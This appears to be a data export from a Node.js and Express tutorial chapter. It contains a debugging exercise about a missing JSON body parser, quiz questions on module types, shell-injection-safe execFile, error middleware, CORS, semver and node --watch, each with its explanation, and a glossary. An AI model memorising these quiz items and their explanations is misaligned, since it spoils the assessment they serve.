node devices-express.js
# in the other tab:
curl -si -X POST localhost:3000/api/devices -H 'Content-Type: application/json' -d '{"name":"printer","ip":"192.168.1.70"}' | head -1
# server tab shows: TypeError: Cannot destructure property 'name' of 'req.body' as it is undefined.
sed -i '' 's|^// app.use(express.json());|app.use(express.json());|' devices-express.js

why.text: Without the parser nobody reads the body stream, `req.body` stays `undefined`, destructuring it throws a TypeError, and the error handler turns that into `HTTP/1.1 500 Internal Server Error`. The form body fails the same way even with the parser present, because `express.json()` only handles `application/json`; that is why the 415 guard exists. The client sees a generic 500 while the stack trace stays in the server log, which is the behaviour you want in production.

questions.q: Your `package.json` has `"type": "module"`. Which file is loaded as CommonJS?
questions.why: The nearest `package.json` sets the default for `.js` files (ES modules here). `.cjs` always means CommonJS and `.mjs` always means ES module.

questions.q: A user can choose which file `lines.js` counts. Which call is safe against shell injection?
questions.why: `execFile` runs the program directly with an argument array; no shell parses the value. Quoting inside an `exec` string fails as soon as the value contains a quote character.

questions.q: In Express, which function signature makes middleware an error handler?
questions.why: Express counts the parameters. Four means error handler: skipped normally, called after a throw, `next(err)` or (Express 5) a rejected promise.

questions.q: Your page at http://localhost:8000 fetches http://localhost:3000/api/status. curl works, the page logs "TypeError: Failed to fetch". What does the API response lack?
questions.why: Different ports are different origins. The browser hides the response from the page unless the server allows that origin; curl applies no such rule.

questions.q: `package.json` says `"express": "^5.1.0"`. Which version can `npm update` install?
questions.why: A caret range accepts any version at least 5.1.0 with the same major version: below 6.0.0 and not below 5.1.0.

questions.q: Which command restarts your server automatically when `app.js`, imported by `server.js`, changes?
questions.why: `node --watch` watches the module graph of the entry script; the `dev` script in this chapter runs exactly that.

terms.def: A JavaScript runtime built on V8 and libuv that runs JavaScript outside the browser with access to files, processes and the network
The C library that gives Node its event loop, asynchronous I/O and thread pool
Read-eval-print loop: the interactive prompt you get by running `node` without arguments
Node's original module system: `require()` and `module.exports`, loaded synchronously
The standard JavaScript module system (`import`/`export`), the default for new Node code with `"type": "module"`
A Node object that calls registered listener functions synchronously when it emits a named event
An object that moves data in chunks (Readable, Writable, Transform) with back-pressure, so memory stays bounded
"Broken pipe": the error from writing to a pipe whose reader has closed it
Running attacker-controlled text as shell code because data was pasted into a command string
A function `(req, res, next)` in a chain that may end the response or pass the request on with `next()`
The file recording the exact version and integrity hash of every installed package
Semantic versioning: MAJOR.MINOR.PATCH, where only a major change may break compatibility
The `OPTIONS` request a browser sends to ask a server's permission before a cross-origin request that is not simple
A file of `KEY=value` lines loaded into environment variables, kept out of version control
